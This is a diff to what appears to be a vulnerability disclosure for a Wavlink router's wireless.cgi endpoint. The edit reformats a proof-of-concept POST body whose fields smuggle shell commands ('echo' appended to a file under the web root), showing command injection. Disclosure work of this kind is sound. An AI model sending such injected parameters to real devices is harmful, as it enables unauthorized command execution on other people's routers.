@@ -49,7 +49,18 @@ Above all, attackers can send `POST` request messages to `/cgi-bin/wireless.cgi`
 Send the following to the URL `http://wifi.wavlink.com/cgi-bin/wireless.cgi` by `POST` request.
 
 ```
-wlan_conf=2860&page=obtw&obtw_enable=1&CCK_1M=;echo 1 >> /etc_ro/lighttpd/www/data.html;&CCK_5M=;echo 2 >> /etc_ro/lighttpd/www/data.html;&OFDM_6M=;echo 3 >> /etc_ro/lighttpd/www/data.html;&OFDM_12M=;echo 4 >> /etc_ro/lighttpd/www/data.html;&HT20_MCS_0=;echo 5 >> /etc_ro/lighttpd/www/data.html;&HT20_MCS_1_2=;echo 6 >> /etc_ro/lighttpd/www/data.html;&HT40_MCS_0=;echo 7 >> /etc_ro/lighttpd/www/data.html;&HT40_MCS_32=;echo 8 >> /etc_ro/lighttpd/www/data.html;&HT40_MCS_1_2=;echo 9 >> /etc_ro/lighttpd/www/data.html;
+wlan_conf=2860
+&page=obtw
+&obtw_enable=1
+&CCK_1M=;echo 1 >> /etc_ro/lighttpd/www/data.html;
+&CCK_5M=;echo 2 >> /etc_ro/lighttpd/www/data.html;
+&OFDM_6M=;echo 3 >> /etc_ro/lighttpd/www/data.html;
+&OFDM_12M=;echo 4 >> /etc_ro/lighttpd/www/data.html;
+&HT20_MCS_0=;echo 5 >> /etc_ro/lighttpd/www/data.html;
+&HT20_MCS_1_2=;echo 6 >> /etc_ro/lighttpd/www/data.html;
+&HT40_MCS_0=;echo 7 >> /etc_ro/lighttpd/www/data.html;
+&HT40_MCS_32=;echo 8 >> /etc_ro/lighttpd/www/data.html;
+&HT40_MCS_1_2=;echo 9 >> /etc_ro/lighttpd/www/data.html;
 ```
 
 # Review Vulnerabilities
